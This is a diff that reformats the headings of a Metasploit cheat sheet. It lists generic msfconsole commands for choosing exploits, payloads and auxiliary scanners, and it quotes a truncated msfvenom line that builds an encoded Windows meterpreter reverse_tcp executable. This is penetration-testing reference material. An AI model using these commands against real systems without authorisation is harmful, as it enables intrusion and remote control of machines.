@@ -161,51 +161,52 @@ $ msfvenom -p windows/meterpreter/reverse_tcp -f exe  -e x86/shikata_ga_nai -i 5
 <h1>$${\color{yellow}EXAMPLES}$$</h1>
 
 
-###### Search for module:
+Search for module:
 
 ```
 msf > search [regex]
 ```
 <br>
 
-###### Specify and exploit to use:
+Specify and exploit to use:
 
 ```
 msf > use exploit/[ExploitPath]
 ```
 <br>
-###### Specify a Payload to use:
+
+Specify a Payload to use:
 
 ```
 msf > set PAYLOAD [PayloadPath]
 ```
 <br>
 
-###### Show options for the current modules:
+Show options for the current modules:
 
 ```
 msf > show options
 ```
 <br>
 
-###### Set options:
+Set options:
 
 ```
 msf > set [Option] [Value]
 ```
 <br>
 
-###### Start exploit:
+Start exploit:
 
 ```
 msf > exploit 
 ```
 <br>
 
-#### Useful Auxiliary Modules
+Useful Auxiliary Modules
 
 
-###### Port Scanner:
+Port Scanner:
 
 ```
 msf > use auxiliary/scanner/portscan/tcp
@@ -214,7 +215,7 @@ msf > run
 ```
 <br>
 
-###### DNS Enumeration:
+DNS Enumeration:
 
 ```
 msf > use auxiliary/gather/dns_enum
@@ -223,7 +224,7 @@ msf > run
 ```
 <br>
 
-###### FTP Server:
+FTP Server:
 
 ```
 msf > use auxiliary/server/ftp
@@ -232,7 +233,7 @@ msf > run
 ```
 <br>
 
-###### Proxy Server:
+Proxy Server:
 
 ```
 msf > use auxiliary/server/socks4
@@ -240,7 +241,7 @@ msf > run
 ```
 <br>
 
-#### msfvenom :
+msfvenom :
 
 The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
 them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.
@@ -414,7 +415,7 @@ msf > session -i [SessionID]
 ```
 <br>
 
-###### Background the current interactive session:
+Background the current interactive session:
 
 ```
 meterpreter > <Ctrl+Z>
